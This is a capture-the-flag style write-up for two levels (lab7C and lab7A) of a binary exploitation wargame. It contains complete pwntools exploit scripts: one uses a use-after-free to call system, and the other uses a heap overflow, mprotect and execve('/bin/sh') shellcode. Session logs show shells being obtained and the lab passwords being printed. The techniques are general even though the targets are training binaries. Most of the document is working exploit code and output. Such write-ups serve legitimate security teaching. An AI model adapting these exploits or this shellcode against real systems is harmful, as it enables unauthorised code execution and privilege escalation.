lab7C:
this is a use after free vulnerabiltiy as the reference is pointing to a unllocated memory location which is then used by another alloc...so when we put a valid address in that spot and call the previews function, we get eip overwrite

from pwn import *
 
p = process("./lab7C")
 
p.recvuntil("Enter Choice: ")
p.sendline("2")                
p.sendline("kain")        
p.recvuntil("Enter Choice: ")
p.sendline("4")             
p.recvuntil("Enter Choice: ")
p.sendline("1")               
p.sendline("/bin/sh")        
p.recvuntil("Enter Choice: ")
p.sendline("6")              
p.sendline("1")             
 
ret = p.recvuntil("Enter Choice: ")
addr_small_str = int(ret[ret.index("enough: ")+8:ret.index("\n")], 10)
log.info("addr_small_str: " + hex(addr_small_str))
 
addr_system = addr_small_str - 0x19da37
 
 
p.sendline("3")               
p.recvuntil("Enter Choice: ")
p.sendline("2")              
p.sendline(str(addr_system)) 
p.recvuntil("Enter Choice: ")
p.sendline("5")               
p.sendline("1")              
p.recv(100)
 
p.interactive()


lab7C@warzone:/levels/lab07$ python3 /tmp/7C.py
[+] Starting program './lab7C': Done
[*] addr_small_str: 0xb7710bc7
[*] Switching to interactive mode
$ whoami
lab7A
$ cat /home/lab7A/.pass
us3_4ft3r_fr33s_4re_s1ck

lab7A
–> Leak the address of messages[0] on the heap using puts.
–> Store a shellcode on the heap which calls execve("/bin/sh").
–> Use the leaked address to call mprotect making the heap executable.
–> Setting the address of the shellcode as the return address of the call.

Finally running the script:
lab7A@warzone:/levels/lab07$ python3 /tmp/7A.py
[+] Opening connection to localhost on port 7741: Done
[*] message_0 = 0x91ca9d8
[*] Switching to interactive mode
$ whoami
lab7end
$ cat /home/lab7end/.pass
0verfl0wz_0n_th3_h3ap_4int_s0_bad

from pwn import *
 
p = remote("localhost", 7741)
 
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68"\
            "\x68\x2f\x62\x69\x6e\x89\xe3"\
            "\x89\xc1\x89\xc2\xb0\x0b\xcd"\
            "\x80\x31\xc0\x40\xcd\x80"
 
 
# create first obj -> overflow 3 bytes changing msg_len
p.recvuntil("Enter Choice: ")
p.sendline("1")                 
p.sendline("131")             
p.sendline("A"*130)            
 

p.recvuntil("Enter Choice: ")
p.sendline("1")                
p.sendline("4")                 
p.sendline("A"*3)              
 
# overwrite second obj
p.recvuntil("Enter Choice: ")
p.sendline("2")                 
p.sendline("0")                 
expl = "A"*132
expl += p32(0x00000000)
expl += p32(0x00000111)
expl += p32(0x0807e372) 
expl += shellcode
p.sendline(expl)               
 

p.recvuntil("Enter Choice: ")
p.sendline("4")                
num = "1\x00"
num += "A"*6
num += p32(0x8050bf0) 
num += p32(0x8049569) 
num += p32(0x80eef60) 
p.sendline(num)               

ret = p.recvuntil("Enter Choice: ")
message_0 = int(ret[0x49:0x4d][::-1].encode("hex"), 16)
log.info("message_0 = " + hex(message_0))
 
p.sendline("1")                 
p.sendline("131")               
p.sendline("A"*130)             

p.recvuntil("Enter Choice: ")
p.sendline("1")               
p.sendline("4")                 
p.sendline("A"*3)               
 

p.recvuntil("Enter Choice: ")
p.sendline("2")              
p.sendline("2")                
expl = "A"*132
expl += p32(0x00000000)
expl += p32(0x00000111)
expl += p32(0x0807e372) 
p.sendline(expl)               
 
p.recvuntil("Enter Choice: ")
p.sendline("4")                 
num = "3\x00"
num += "A"*6
num += p32(0x806f340)         
num += p32(message_0 + 276)    
num += p32(message_0 - 0x19d8) 
num += p32(0x22000)            
num += p32(0x7)                
p.sendline(num)                 
p.recv(100)
 
p.interactive()

